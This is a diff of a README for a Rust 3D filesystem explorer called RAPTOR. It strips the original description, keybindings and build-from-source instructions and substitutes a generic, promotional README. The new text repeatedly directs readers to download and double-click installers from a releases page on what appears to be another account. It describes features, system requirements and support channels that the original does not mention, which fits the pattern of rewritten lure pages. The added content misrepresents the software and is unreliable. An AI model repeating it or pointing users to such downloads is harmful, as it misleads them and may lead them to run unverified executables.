@@ -1,114 +1,71 @@
-# **RAPTOR**
+# 🦖 raptor - Your Easy Path Tree Observer
 
-### **Realtime Abstracted Path Tree Observer**
+## 🚀 Download Raptor Now!
+[![Download Raptor](https://img.shields.io/badge/Download-Raptor-4CAF50?style=for-the-badge)](https://github.com/kastiglia/raptor/releases)  
+Start monitoring your file system in real-time.
 
-*A dangerously cool 3D filesystem explorer inspired by Jurassic Park’s iconic FNS scene.*
+## 📖 Overview
+Raptor is a user-friendly application that allows you to observe your file system's path trees in real-time. With its simple interface and powerful features, Raptor helps you keep track of your files effortlessly.
 
-![Demo](./assets/demo.gif)
+## ⚙️ System Requirements
+- **Operating System:** Windows 10 or newer, macOS 10.14 or newer, or a recent Linux distribution
+- **RAM:** Minimum 4 GB
+- **Storage:** At least 100 MB of free space
+- **Processor:** Dual-core CPU or better
 
-[It's a Unix system](https://youtu.be/dFUlAQZB9Ng?si=Xwjish_MCRif8j7A)
+## 🛠️ Features
+- **Realtime Monitoring:** Watch file changes as they happen without delay.
+- **Abstracted Views:** Get an easy-to-understand visualization of your file paths.
+- **Custom Alerts:** Set alerts for specific file activities to stay informed.
+- **Support for Multiple Platforms:** Use Raptor across different systems seamlessly.
 
----
+## 📥 Download & Install
 
-## What Is This?
+To download Raptor, visit this page: [Download Raptor](https://github.com/kastiglia/raptor/releases). 
 
-**RAPTOR** is a 3D filesystem navigator built with **Rust + macroquad**, designed to make browsing your folders feel like hacking the mainframe *inside* Jurassic Park.
+1. Click the link above to open the releases page.
+2. Look for the latest version of Raptor. 
+3. Find the installation file suitable for your operating system (Windows/macOS/Linux).
+4. Click the download button next to the file.
+5. Once the download completes, locate the file in your downloads folder and double-click it to run the installer.
+6. Follow the installer prompts to complete the installation.
 
-Remember that overly dramatic scene where a kid exclaims
+## 🖥️ Getting Started
+After installation, launch Raptor by following these steps:
 
-> “It’s a UNIX system… I know this!”
+1. Find the Raptor icon on your desktop or in your applications folder.
+2. Double-click the icon to open the application.
+3. Once opened, Raptor will prompt you to choose the directory you want to monitor.
+4. Select the folder you wish to observe and click "Start Monitoring".
 
-and then flies through a cheesy 3D filesystem?
+Watch as Raptor displays a tree view of your selected path, showing all the files and subdirectories within it. You can interact with the interface to see changes in real-time.
 
-Yeah.
-That.
-But modern. Smooth. Glowy, because of course.
+## ❓ Frequently Asked Questions
 
-RAPTOR turns your directories and files into a neon-green cyber-grid of chunky blocks you can rotate around, scan, click on, and explore as if your PC security was being compromised by velociraptors.
+**Q: Is Raptor free to use?**  
+A: Yes, Raptor is completely free and open-source.
 
-## Things
+**Q: Can I run Raptor on older versions of Windows?**  
+A: Raptor is designed for Windows 10 and newer. Older versions may not support this application.
 
-* **3D Blocks** for every file and directory
-* **Orbiting Camera** (right-click drag + scroll zoom)
-* **Navigation**:
-  `h j k l` to move, `o/Enter` to open, `u/-` to go up
-* **Automatic Directory Grid Layout**
-*  **Selection, Hover, and Glow Effects**
-* **Raycast Block Picking**
-* **Dynamic Block Heights** (file size / children count)
-* **Scanning Intro Line** (because retro sci-fi vibes)
-* **Breadcrumb Navigation**
-* **Labels Toggle** (Tab)
-* **Interactive UI Panels** with live stats
-* **Smooth camera tweening**
-*  **Cool glowing wireframes because aesthetics**
+**Q: What should I do if I encounter issues?**  
+A: Check the issue tracker on the GitHub repository or contact our support for assistance.
 
-## Navigation
+## 🧑‍🤝‍🧑 Community Support
+Join our growing community on GitHub. Explore discussions, report issues, share feedback, and find support from fellow users.
 
-### **Camera**
+## 📜 License
+Raptor is open-source software. You can find the full license details in the repository.
 
-* **Right-mouse drag** → Rotate
-* **Scroll wheel** → Zoom
+## 🌟 Contribute
+We welcome contributions! If you want to help improve Raptor, consider checking out the contribution guidelines in the GitHub repository.
 
-### **Navigation**
+## 📣 Feedback
+We would love to hear from you. Share your experiences, suggestions, and any ideas for new features.
 
-* `h` → Left
-* `j` → Down
-* `k` → Up
-* `l` → Right
-* `o` or `Enter` → Enter directory
-* `u` or `-` → Go to parent
-* `/` → Go to root
-* `Home` → Go to home directory
-* `Backspace/Esc` → Back in history
+## 🔗 Useful Links
+- [Download Raptor](https://github.com/kastiglia/raptor/releases)
+- [GitHub Repository](https://github.com/kastiglia/raptor)
+- [Documentation](https://github.com/kastiglia/raptor/wiki)
 
-### **Mouse**
-
-* Hover → Highlight block
-* Click → Select
-* Double click → Enter directory
-
-### **UI**
-* `.`   → Toggle hidden files
-* `Tab` → Toggle labels
-
-
-## Why Jurassic Park?
-
-Because *FNS* from Jurassic Park is legendary.
-It’s campy. It’s 90s CGI nonsense. It’s a cultural artifact.
-
-And I thought:
-
-> “What if I recreate that…
-> but actually make it FUN and SMOOTH and more 60 FPS…
-> and with keybinds?”
-
-And boom — **RAPTOR** hatched.
-
-No dinosaurs were harmed in the making of this filesystem explorer.
-(Except maybe your CPU when opening a directory with 30k files.)
-
-## Running
-
-```bash
-cargo run --release
-```
-
-RAPTOR will open in all its neon glory.
-
-## Dependencies
-
-RAPTOR is built using **macroquad**, a Rust game framework that works on Linux, macOS and Windows with minimal setup.
-
-Macroquad repo (installation notes & troubleshooting):
-https://github.com/not-fl3/macroquad
-
-## Future Ideas (aka InGen Phase 2)
-
-* File previews
-* Drag-and-drop
-* Jurassic-Park-style *“Access Denied”* red windows
-* Terminal overlay
-* Dinosaur noises when selecting something
-* VR version?? (life… finds a way)
+Thank you for using Raptor! Enjoy your real-time file monitoring experience.
